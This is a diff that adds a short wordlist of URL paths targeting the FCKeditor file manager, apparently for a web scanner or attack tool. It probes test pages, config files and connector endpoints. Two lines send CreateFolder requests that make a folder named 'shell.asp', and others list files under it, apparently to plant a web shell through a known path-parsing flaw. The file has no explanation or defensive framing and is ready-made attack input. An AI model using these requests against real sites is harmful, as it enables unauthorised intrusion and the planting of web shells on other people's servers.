@@ -1,0 +1,10 @@
+/FCKeditor/editor/filemanager/upload/test.html
+/FCKeditor/editor/filemanager/browser/default/connectors/test.html
+/FCKeditor/editor/filemanager/browser/default/connectors/php/config.php
+/fckeditor/editor/filemanager/connectors/asp/config.php
+/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Fshell.asp&NewFolderName=z&uuid=1244789975684
+/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp
+/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F
+/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F
+/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp
+/FckEditor/editor/filemanager/connectors/aspx/connector.aspx
